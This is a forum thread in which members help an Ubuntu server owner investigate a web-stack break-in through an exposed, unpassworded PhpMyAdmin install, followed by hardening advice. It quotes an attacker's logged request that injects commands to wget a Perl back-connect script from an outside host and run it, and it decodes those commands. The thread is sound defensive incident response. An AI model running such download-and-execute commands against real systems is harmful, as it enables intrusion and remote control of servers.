OpenSSH logs with the "auth" facility and indeed Rsyslogd puts them in /var/log/auth.log ..


> **johnnyb123 said:**
> I looked at the Logfile var/log/auth.log for entries on Feb 8 around 9:07 and, again, there seems to be a large number of records missing compared to other days. Throughout the auth.log file, there are thousands of lines like:

Feb  6 06:53:47 ubuntu1 CRON[24128]: pam_unix(cron:session): session closed for user root
Feb  6 06:54:01 ubuntu1 CRON[24370]: pam_unix(cron:session): session opened for user www-data by (uid=0)
The "opened for .. by (uid=0)" only means that the Cron daemon runs (usually started at boot from init) as UID 0 (root), nothing more.


> **johnnyb123 said:**
> A. In the /var/log/messages file, there are instances of a line containing "restart".  Example:
Feb  7 06:33:19 ubuntu1 syslogd 1.5.0#1ubuntu1: restart.
- Note: I have not restarted ubuntu in months.  These entries always fall between 6:20 and 6:47 in the morning.  Definitely not done by me.
It only signifies a *system* restart if the following "klogd log source = /proc/kmsg started" line is followed by a "ubuntu1 kernel: Linux version" line, else it's a Rsyslogd daemon restart (OK, AFAIK).


BTW 'last' means just running 'last'.


> **johnnyb123 said:**
> A. I found numerous lines in the Apache log
The only lines that bother me are of the "GET //phpmyadmin//config.inc.php (..) 200" kind as the "200" returned status here means requests the webserver **did** honour, meaning you **did** run PhpMyAdmin (and publicly accessible)?..



> **johnnyb123 said:**
> 54 9 * * * /etc/webmin/cron/tempdelete.pl
* * * * * /var/tmp/bb/update >/dev/null 2>&1
The first one does look benign but until you inspect both ('file /var/tmp/bb/update; stat /var/tmp/bb/update; less /var/tmp/bb/update') you won't know and so we won't know. Looking at the crontab entry itself though I'd say it would be odd to be running something at an "* * * * *" interval.


> **johnnyb123 said:**
> Do you think I am ready to weed out the selected "www-data" files and folders and cron jobs, then do the upgrades to Ubuntu 8.04.4 and Webmin 1.5 and put the server back on line again?
While I'm aware you have other constraints I would not recommend that, not at this stage and not procedurally. I'll get into the why later on. Let's see if we can speed things up with the information you'll provide. If you can't manage to drop off the tarball you're invited to send me an email to make other arrangements.


Hang in there, we're getting close.

---

### Post by Scunizi on 2010-02-12
After scanning the posts there's a couple of things that I don't see mentioned.  First is that Webmin, although functional, is not recommended as it doesn't follow ubuntu guidelines.. with upgrades it may break or break something else.  Also 8.04.01 looks to be the original ISO install.  If you end up reinstalling or manage to clean out the offending code then do a full upgrade with "sudo apt-get update && sudo apt-get upgrade && sudo apt-get dist-upgrade" ... the dist-upgrade will not take you to the next release but will upgrade packages to a higher version if they are available.. good luck

---

### Post by johnnyb123 on 2010-02-12
> **mr-woof said:**
> Have you got any ideas on how they managed to get into your system yet?
Not yet, mr-woof.  But I understand that we're getting close.

---

### Post by amac777 on 2010-02-12
> **johnnyb123 said:**
>  Originally Posted by mr-woof  View Post
Have you got any ideas on how they managed to get into your system yet?

Not yet, mr-woof.  But I understand that we're getting close.

I suggest you take a look at the file config.inc.php in your phpmyadmin directory. From this: 

> - 92.63.130.117 - - [20/Jan/2010:09:13:57 -0500] "GET //phpmyadmin//config.inc.php?c=cd%20/var/tmp;%20wget%20bilssh.is-the-boss.com/dc.pl%20;%20perl%20dc.pl%20193.194.87.139%202753 HTTP/1.1" 200 11 "-" "Conf"


it really looks to me like the hacker has used that file to execute commands on your server. For example, the part quoted above clearly shows these commands being passed:

```

cd /var/tmp
wget bilssh.is-the-boss.com/dc.pl
perl dc.pl 192.194.87.139
```

There is just no way that phpmyadmin's original config.inc.php file should allow people to do this. (or if it does, what the heck for?)

As for ideas of how they got in initially, here's a couple very obvious ones:

1. Guessed or knew one of your user's ftp username / password and then uploaded a php script that allows them to do anything as that user or pass commands to your server as that user or www-data.

2. Used a web-based file uploader on one of the web sites on your server to upload a scipt that allows them to do any command as www-data. For example, a picture uploader or any kind of a file submission function that you or your users may have installed could allow this.

---

### Post by johnnyb123 on 2010-02-12
I am still waiting for sourceforge to confirm my account by email.  I suspect that they validate them manually.

Q. Can you correlate with your firewall and router logs there was absolutely no traffic during that period?
A. I checked my firewall/router access logs and it looks like it keeps a rolling record of the last couple hundred activities.  I've never had the need to look back beyond each day's activity so I never gave this much mind.  Until now.  I don't have firewall records from the suspected break in date.  Frustrating.

Q. OpenSSH logs with the "auth" facility and indeed Rsyslogd puts them in /var/log/auth.log 

A. This one went over my head.  I searched the Ubuntu site for information on the "auth facility" but could not find the actua command to run.  I ran the command "grep sshd /var/log/auth.log | less"

A. There were many lines stating "Failed password for root...", so I searched therough /var/log/auth.log for the string "Accepted password for root" and there were no matches found.

Q. meaning you did run PhpMyAdmin (and publicly accessible)?..
A.  I don't think I have ever run PHPMyAdmin.  Actually I don't even know how to launch this app.  I looked in the directory /etc/phpmyadmin, and one file called "htpaswd.setup" had User-root and Group=www-data.  It contained the following line:

admin:*

I suspect that this is a problem.

Q. If you can't manage to drop off the tarball... 
A. Ha ha...ok...newbie statement here.  Is a "tarball" those temp hacler files that I downloaded from my Ubuntu server.  If so then, yes, I would be more than happy to email them directly to you.

Again, my sincerest thank you for your guidance.
-John

---

### Post by unspawn on 2010-02-13
> **Scunizi said:**
> After scanning the posts there's a couple of things that I don't see mentioned.
And there's a good reason for that. In fora it often happens members (esp. "one post drive-by" types) are too busy wedging their valuable replies in, too quick mixing assumptions, opinions and "advice", leading to a confusing jumble of signals and steps for the OP to follow. Incident response, at least the way I like to perform it, starts with mitigating, assessing and understanding the situation before making any recommendations.


> **amac777 said:**
> There is just no way that phpmyadmin's original config.inc.php file should allow people to do this. (or if it does, what the heck for?)
See cve.mitre.org.

> **johnnyb123 said:**
> I looked in the directory /etc/phpmyadmin, and one file called "htpaswd.setup" had User-root and Group=www-data.  It contained the following line:
admin:*
Recall that in your webservers access logs you saw 92.63.130.117 getting commands through which means you can also move your suspected date of entry to Jan 20, 2010 @ 09:13 -0500 and this gives you at least one fix on a possible entry point. For details see [http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=PHPMyAdmin](http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=PHPMyAdmin). PHPMyAdmin is a server administration tool and any path (commonly /phpmyadmin) therefore should never be exposed to world without good access restrictions. Next to that it's obviously an outdated version as (I think CVE-2009-1285-ish) was fixed in a later release.


> **johnnyb123 said:**
> I would be more than happy to email them directly to you.
I maintain a drop-off at Gmail, the account name there equals my handle here: just drop an empty "ping" if you need confirmation.


Summarizing what was shown in previous posts: one machine inside a LAN, running Ubuntu-8.04.1 (outdated), running Exim-4.69, OpenSSH-4.7p1 (with root access allowed), MySQL-5.0.51 accessible to world. In the web stack Webmin-1.42 and PHPMyAdmin (admin account, without password) are shown. Found directory names are ".." (or is this "..." or ". ." or " .." or ".. "?) and "fl" and files include a renamed tarball, IRC bot, flooder, possible scanners, standard Perl backdoor, and /var/tmp/bb/update (only service related to I know of is "Big Brother"). File and process ownership is user "www-data" and time of breached was indicated by OP as Feb 8, 2010 @ 09:07. Consistency of log files is questionable. OP does not indicate that inspection of other logs yields results (search method?) but webserver access logs show IP 92.63.130.117 commands succeed moving scope of date of entry back to Jan 20, 2010 @ 09:13 -0500. No backups made before the breach are available to verify integrity against. By default Ubuntu (Debian) package management does not include built-in fine-grained methods of verifying integrity on the file level. Availability of file system integrity checking tools (Samhain, Osiris, Integrit, Aide or even tripwire) is unknown. Output of CERT-listed commands is unknown. While not all the details are in, in short I'll conclude this looks like the average web stack-level breach. 

Even with your constraints in mind, what I would recommend at this point, is to rebuild your setup from scratch on a new machine. The main reason for that is that it will take you too much time and effort to assess the integrity of each component manually (see package management comment before) and a secure, safer, clean setup is way easier to accomplish. With all due respect, and you know that yourself already but I need to emphasise this: you need to fix your missing skills Real Soon Now. Being able to run a web-based panel does not equal good server administration skills. Regardless of if you have paying customers or non-paying clients in the end they will appreciate the added value it brings to their business in terms of security, continuity of operation and reliability which rubs off on your (business) image: trust is easy to lose but hard to (re-)gain. Even with your constraints you should acknowledge that running GNU/Linux is all about performance, protecting assets and providing services in a continuous, stable and secure way and that trying to "patch things up" is a practice I strongly advice against. 


OK. Bad news talk is over. You need to spend time properly hardening the machine before you put it in your DMZ. That topic could be dealt with after you've commented or if you like in a new thread (please link back to this one then). That's about all for now, good luck!

---

### Post by johnnyb123 on 2010-02-15
> **Scunizi said:**
> After scanning the posts there's a couple of things that I don't see mentioned.  First is that Webmin, although functional, is not recommended as it doesn't follow ubuntu guidelines.. with upgrades it may break or break something else.  Also 8.04.01 looks to be the original ISO install.  If you end up reinstalling or manage to clean out the offending code then do a full upgrade with "sudo apt-get update && sudo apt-get upgrade && sudo apt-get dist-upgrade" ... the dist-upgrade will not take you to the next release but will upgrade packages to a higher version if they are available.. good luck
Thank you scunizi.  After scouring my server comparing it with my friend's server which is a 'clean' server, deleting all suspect files, folders, processes, cron jobs, changing passwords, installing firewall monitoring software, I ran the three commands you recommended.  
I needed to get this server back up and running the websites for my customers until I decide whether to wipe this clean and reload everything.

Thank you again!

---

### Post by johnnyb123 on 2010-02-15
> **amac777 said:**
> I suggest you take a look at the file config.inc.php in your phpmyadmin directory. From this: 



it really looks to me like the hacker has used that file to execute commands on your server. For example, the part quoted above clearly shows these commands being passed:

```

cd /var/tmp
wget bilssh.is-the-boss.com/dc.pl
perl dc.pl 192.194.87.139
```

There is just no way that phpmyadmin's original config.inc.php file should allow people to do this. (or if it does, what the heck for?)

As for ideas of how they got in initially, here's a couple very obvious ones:

1. Guessed or knew one of your user's ftp username / password and then uploaded a php script that allows them to do anything as that user or pass commands to your server as that user or www-data.

2. Used a web-based file uploader on one of the web sites on your server to upload a scipt that allows them to do any command as www-data. For example, a picture uploader or any kind of a file submission function that you or your users may have installed could allow this.
Thank you amac777.

One of the things that I did during my clean up procedure over the past few days is to remove phpmyadmin from the installation.  I shouldn't have loaded it in the first place because I didn't need to administer my php that way.  We'll see if that takes care of things for now.

Thank you again,
-John

---

### Post by HermanAB on 2010-02-15
Howdy,

Nice detective work.  I think it shows the value of using PAM to enforce secure passwords.  Some user always thinks that a 4 character password is kewl, unless you prevent them from doing that.

See these for PAM password length information:
[http://kbase.redhat.com/faq/docs/DOC-2719](http://kbase.redhat.com/faq/docs/DOC-2719)
[http://www.linux.ie/articles/pam.php](http://www.linux.ie/articles/pam.php)

I think it is criminal that Ubuntu by default allows very short passwords.  This is the real reason why there are so many tales of woe about getting machines hacked on these forums.  I would like to file an improvement bug on this, but I cannot, since I don't currently have a running Ubuntu machine.  Ubuntu is weird since it makes filing bugs really difficult, which may be a reason for its relatively low quality.

BTW, there is a program called 'nethogs' that can immediately show you which process is consuming bandwidth.

---

### Post by unspawn on 2010-02-16
> **HermanAB said:**
> Nice detective work.
Thanks.


> **HermanAB said:**
> I think it shows the value of using PAM to enforce secure passwords.
In this particular case: no, not really, as the most probable point of entry was established as PhpMyAdmin, which authenticates through Apache, and which had a setup-default password of "none". I'm pretty sure  PhpMyAdmin install docs say to secure the installation by removing setup defaults. 


> **HermanAB said:**
> This is the real reason why there are so many tales of woe about getting machines hacked on these forums.
No, I'd say the *real* reason GNU/Linux machines get compromised easily is because people 0) "just install" and then expose the machine w/o giving any thought to hardening and 1) don't watch logs and 2) don't regularly audit their machines. Of the incidents I've seen the past five years only one in a hundred actually led to a root account compromise and saw a "traditional" rootkit installed. The others were basically web stack level compromises. 


* In the case of PhpMyAdmin it's the admin tool that should not have been exposed to world but run with appropriate httpd.conf "deny from; allow from" rules and both mod_security (active) and Logwatch (passive) could have helped thwart the attack or alert the admin.


** BTW if anyone wondered about the cronjob: that was a simple script incorporated in one of the toolkits replacing the current webservers crontab (if any): adding the www-user account to /etc/cron.deny could have denied the user running any jobs.

---

### Post by benmoreassynt on 2011-03-29
I suffered the exact same exploit. I think phpmyadmin was to blame (old version 2.x, installed on Debian Lenny). Here are some actions I took, and lessons learned that may be useful to others.

UDP FLOOD EXPLOIT LESSONS

Following security changes made to stop this happening again

1. Change iptables to disallow all outbound udp network traffic, except for DNS system (port 53) and ntpd (port 123)

3. Log firewall dropped packets to /var/log/firewall

4. Mount /tmp partition as non-executable and non-suid-able. (mount -o remount,noexec,nosuid tmp)

5. Update /etc/fstab with following line for mounting /tmp partition:

/dev/sda8       /tmp            ext3    noexec,nosuid        0       2
 (it may not be /dev/sda8 obviously on your machine. Use df -h to find out)
5. Delete /var/tmp (the directory that was exploited), and instead symlink it to /tmp.

6. Check that apt-get can execute files in /tmp when installing, by adding the following to /etc/apt/apt.conf:

```
DPkg::Pre-Install-Pkgs {"mount -o remount,exec /tmp";};
DPkg::Post-Invoke {"mount -o remount /tmp";};
```

Most likely candidate appears to have been phpmyadmin not being locked down by IP, and Debian Lenny providing an older 2.x version. Updated phpmyadmin to 3.x on Tizer, and locked down by IP.

Some servers may not have tmp as a disk partition - but you can still mount it as non-executable with the following workaround:

1. ```
sudo mv tmp/ tmp-real
```
2. ```
mkdir tmp
```
3. ```
mount --bind tmp-real tmp
```

You now have tmp as a 'mounted' version to tmp-real.

NOTE: with mounting directories like this, you have to then REMOUNT the directory non-executable (can't be done in first step using mount for some reason).

```
mount -o remount,noexec,nosuid tmp
```

The tmp-real directory still is accessible and executable by all, but no applications will know to find that or use it. tmp/ is now secure, and nothing can be executed it it.

Although it requires two commands to do this at command line, the fstab command does it in one go (see /etc/mtab for a great rundown of the fstab syntax you will need to create your current mount setup).

This would be the line to add to /etc/fstab

```
/tmp-real /tmp none rw,noexec,nosuid,bind 0 0
```

Depending on what server you are running, whether it is a production server, etc, it may be advisable to upgrade to a newer version of the distribution. I upgraded the affected server to Debian Squeeze, which recently became the stable Debian branch. A drawback of Debian is the trade-off between stability and older versions of software that may be insecure. Ubuntu users might benefit from the same approach of keeping the server up to date.

---

### Post by rookcifer on 2011-03-30
OP,

I haven't read all of the thread (just the first page), but the good news is it doesn't look like the attacker got root (he only seems to have access to /var/tmp, which is user owned).  The bad news is, I still would not trust the server at all.  I think the smart thing to do is as follows:

1) Backup all important files on the server

2) Download the latest ubuntu server edition

3) Wipe the server hard disk

4) Install the latest Ubuntu

5) Copy all important backed-up files onto the machine. 

6) Read carefully on how to secure and administer a server machine (follow unspawn's advice regarding PhPMyAdmin).

I recommend you read up on how to secure Apache.  Also look into securing all network listening services with AppArmor profiles.  Since you're a new Linux user, these things might take some time, but if you're going to run a server open to the world, it is imperative that you keep the server up to date (say once a week or so) and learn about these extra hardening procedures.  

And never, ever leave a service that can be password protected with the default password.  I haven't read the thread in depth, but this seems to be one of the issues leading to this attack.

---

